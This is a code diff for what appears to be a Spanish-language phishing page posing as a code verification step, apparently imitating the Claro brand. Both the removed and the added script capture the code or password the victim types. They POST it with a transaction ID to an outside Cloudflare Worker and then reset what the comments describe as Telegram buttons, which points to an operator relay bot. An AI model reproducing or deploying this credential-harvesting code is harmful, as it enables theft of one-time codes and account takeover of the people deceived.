@@ -1,39 +1,54 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-  <meta charset="UTF-8">
-  <title>Verificación</title>
-</head>
-<body>
-  <h2>Ingrese el código recibido</h2>
-  <form id="codigoForm">
-    <input type="text" id="codigo" placeholder="Código" required>
-    <button type="submit">Confirmar</button>
-  </form>
+<script>
+    const inputs = document.querySelectorAll('.password-input');
 
-  <script>
-    document.getElementById("codigoForm").addEventListener("submit", async (e) => {
-      e.preventDefault();
+    inputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            if (e.target.value !== '') {
+                if (index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            }
+        });
 
-      const codigo = document.getElementById("codigo").value;
-      const transactionId = localStorage.getItem("transactionId");
-
-      // 📤 Aquí podrías enviar el código al Worker (si lo quieres almacenar/validar)
-      await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/codigo", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ id: transactionId, codigo })
-      });
-
-      // 🔄 Reset para desbloquear y que vuelvan los botones en Telegram
-      await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/reset", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ id: transactionId })
-      });
-
-      alert("Código enviado correctamente ✅");
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && index > 0) {
+                inputs[index - 1].focus();
+            }
+        });
     });
-  </script>
-</body>
-</html>
+
+    document.getElementById('continuar').addEventListener('click', async () => {
+        // Concatenar valores
+        const inputValues = Array.from(document.querySelectorAll('.password-input'))
+                                .map(input => input.value)
+                                .join('');
+
+        const transactionId = localStorage.getItem("transactionId");
+
+        if (!transactionId) {
+            alert("❌ No se encontró transactionId");
+            return;
+        }
+
+        // 📤 Enviar el código al Worker
+        await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/codigo", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ id: transactionId, codigo: inputValues })
+        });
+
+        // 🔄 Hacer reset para que vuelvan los botones en Telegram
+        await fetch("https://blue-night-7897.claropromoxlaro.workers.dev/reset", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ id: transactionId })
+        });
+
+        alert("✅ Código enviado y botones reactivados");
+        window.location.href = "verificando.html"; // o la que quieras
+    });
+
+    document.getElementById('cancelar').addEventListener('click', () => {
+        window.location.href = 'index.html';
+    });
+</script>
